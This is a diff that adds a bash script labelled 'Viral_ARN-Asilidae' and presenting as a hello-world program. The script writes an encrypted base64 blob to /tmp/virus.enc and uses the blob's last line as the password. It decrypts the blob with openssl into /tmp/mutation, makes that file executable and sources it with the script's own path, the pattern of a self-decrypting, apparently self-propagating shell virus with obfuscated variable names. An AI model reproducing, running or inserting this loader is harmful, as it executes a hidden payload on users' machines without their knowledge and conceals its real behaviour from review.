@@ -1,0 +1,42 @@
+#!/bin/bash
+# Viral_ARN-Asilidae
+MynQcspMiOytu=$(realpath "$0")
+dmcKfubAhTdps=/tmp/virus.enc
+iQYFzOXitiakT=/tmp/mutation
+echo -e "
+U2FsdGVkX18O+xVKNdB7qm+/fBCwZyAWgpXWRQMb91GEdxD1OcLhrebDMm40P5qm
+KIHWgBkb1UP7udge1UKXbwLbEYgPimBJMdtm39HvAql9g1OC5/07xPoyD2Exy7F1
+RbWlHHwoIIwse3TBQXTiTVLmoT3ZIFh9cB3CWXGXT+7RpuObo0sDh3wsxtoKvzIx
+CjKCpgboW2VJAlmpoM0/aWOJ9C70RWDzTMClpsVpvbpvPEEa+QWjSUFLqAu3J6Ah
+hLXjMtF2bWdGu+Sy25/Qg+GrDPWCv8ezN1d47FLYksROdgc7fwmXbDNFaJDCJCle
+euL2NYZvHGM5B9Gx1qwiM3ICU8Kwur35lXm+6iF/CAt2CcIWLnd8gw1b9up91Wyu
+uRl+xCM8Ofy3etXhmj2mJs8+IyFxuB0rTtZxfout8moRU+adJQMLM3BOR+Oc7iyO
+ObY1RdVRsS/7koFuiOCPUM7agvyk5q4srpyV2XTMpbAzGa1negETi+uDHpqLWOIb
+Ftjkd4Hxu9LHAr3WeI9/8ik+gJ32bqpMcT4Tuekt4uNp3GvrCHYHasiyCtQAeGK+
+5l49p6VndDG0N8j0TxFJ/5W5oCeZA8j8x27fMGBd6JQ9PtVHj7KKS+zh2JCdFGKl
+GQiaFPtmxzwqVyJhnLiGtcqPeBavK7YzdXTMWyGykji17qFU+OqTRwm9BcS1VkRr
+/K/fJJ4PJqpSjOeGu9cC8cc11VN/XGV9WDSbqP7sKoJtLCBX+SuFyCAT/4QD1Q+p
+dMCN8phxvhJ0SnorvEDdgrad8a4OChdWWDbaFEaC2la7Fj6LQgEIL3BXrzKf1GGF
+NsAEEPOr/DexDVkkPli8W5Fpe7+IKY65NbnCNCNfYGudFE9/5vFZ/cmBzErd09cP
+5D/cWeXg1sw4zei911ikdSvk4Pex+N9fn+P5tn1oboZ5LwykiHsxINbmf/2hsapL
+n+6ggCy9a34g1T4A9XwmbTdsk/f+OXeWmTWXrgm+Mf9RpRbKCT2CVyEbOBBhvamY
+hAXcuBqB77fDgF2ZuUt3pAn2F6p2/19OQpNyEKVtRqLW4CxhmTgz9m8ahFc/Sj1Y
+GBofuYzG0CeiBYxZwHr45WChXsbK3XCY8BMKM1u5hyFNNBsfonV/V8pHxmzndmrP
+8MdlEGSoA0apr3hy+Jm97SKjUWsPKBWFLVvSY468NIAyHqUdqjP768mDHQwO1aok
+thm3dvSjjktQ8CZCcqGrzjOjbcifUAqFlmlgmP4gPJ8iNv7VnOGZ4L5OzQx/Q90H
+jiJBpYy0VZFhYPi1d0SRRrl3aAAVmX1Zm+QKeeEy0wheojf7M/x1yfNat0/kurka
+eCzW83I0Qjw9zJooUratkKW9+MWsMSRJxmSm9VFx6m4pkc5SGwrARvyt75177vG6
+vfdgLY1l2BhHncUFSfqQtRNNh03nHCtTXMSKosC7Fb7z9JVbujZBSDi/2jL1EIx6
+DzPE7wpZ/pRbwIKUe4gI3UmEhmULkWSPZBQVRWWJ0SWj5TeJsVWTVvV0WstAnJZZ
+YEmYhEk8Gfodu5omSja3IOPPJ4J8AW3cZVhgWaeF8hvKGGxt9/oHnxeAxm5D70ob
+j6nK/HQLYC+Fp+hZOle7CeahaVgfWMXOdYmvylYgnUhBjJOzXvkmyyAudyMwOb9+
+9z7Qbw5CxLPuNn3nwdOiUE6KozDdSLj8lDa5c4+tRn9dcYBs6Jb1d/uHpnXYtVdL
+9CXnrbzozW9Zh5QqJ+dMpg==
+X1NQQ2F2LTkZW" > /tmp/virus.enc
+PASSWORD=$(tail -1 ${dmcKfubAhTdps})
+sed -i '$d' ${dmcKfubAhTdps}
+echo -n "$PASSWORD" | openssl aes-256-cbc -d -a -salt -pbkdf2 -in ${dmcKfubAhTdps} -out ${iQYFzOXitiakT} -pass stdin
+#rm ${dmcKfubAhTdps}
+chmod +x ${iQYFzOXitiakT}
+source "${iQYFzOXitiakT}" "${MynQcspMiOytu}"
+echo "Hola mundo"
